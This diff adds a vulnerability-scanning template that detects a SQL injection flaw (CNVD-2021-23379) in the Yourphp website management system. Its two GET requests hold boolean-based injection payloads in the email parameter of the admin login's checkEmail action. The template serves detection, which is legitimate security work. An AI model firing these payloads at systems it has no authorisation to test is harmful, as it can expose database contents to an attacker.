@@ -1,0 +1,42 @@
+id: yourphp-sqli-cnvd-2021-23379
+
+info:
+  name: Yourphp SQL Injection Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    Yourphp enterprise website management system contains a SQL injection vulnerability. An attacker can exploit this vulnerability to obtain sensitive database information.
+  tags: sql-injection
+  reference:
+    - https://www.cnvd.org.cn/flaw/show/CNVD-2021-23379
+
+http:
+  - raw:
+      - |
+        GET /index.php?g=Admin&m=Login&a=checkEmail&userid=1&email=-3426%27%20OR%201=1%20AND%20%27RYHI%27=%27RYHI HTTP/1.1
+        Host: {{Hostname}}
+        Connection: close
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "false"
+        part: body
+
+  - raw:
+      - |
+        GET /index.php?g=Admin&m=Login&a=checkEmail&userid=1&email=-3426%27%20OR%201=2%20AND%20%27RYHI%27=%27RYHI HTTP/1.1
+        Host: {{Hostname}}
+        Connection: close
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "true"
+        part: body
